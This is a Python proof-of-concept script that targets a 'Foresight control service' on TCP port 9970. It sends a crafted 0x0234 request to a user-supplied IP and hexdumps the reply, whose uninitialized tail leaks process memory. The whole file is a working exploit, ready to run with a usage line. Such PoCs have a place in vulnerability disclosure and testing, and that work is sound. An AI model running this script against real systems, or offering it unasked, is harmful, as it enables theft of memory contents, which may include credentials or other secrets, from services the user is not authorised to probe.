#!/usr/bin/env python3
"""Foresight control service (TCP 9970) memory disclosure PoC.

A plaintext 0x0234 request is answered with a fixed 263-byte reply whose tail
is never initialized, leaking process memory. Usage: fss_memleak_poc.py <ip>
"""
import socket
import struct
import sys

PORT = 9970


def hexdump(data):
    for off in range(0, len(data), 16):
        chunk = data[off:off + 16]
        hexs = " ".join(f"{b:02x}" for b in chunk)
        text = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"{off:04x}  {hexs:<47}  {text}")


def main():
    if len(sys.argv) != 2:
        sys.exit(f"usage: {sys.argv[0]} <ip>")
    ip = sys.argv[1]

    request = struct.pack("<HI", 0x0234, 0)  # msg_id 0x0234, zero-length body

    sock = socket.create_connection((ip, PORT), timeout=5)
    sock.sendall(request)
    sock.settimeout(2)

    reply = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            reply += chunk
    except socket.timeout:
        pass
    sock.close()

    print(f"received {len(reply)} bytes from {ip}:{PORT}")
    hexdump(reply)


if __name__ == "__main__":
    main()
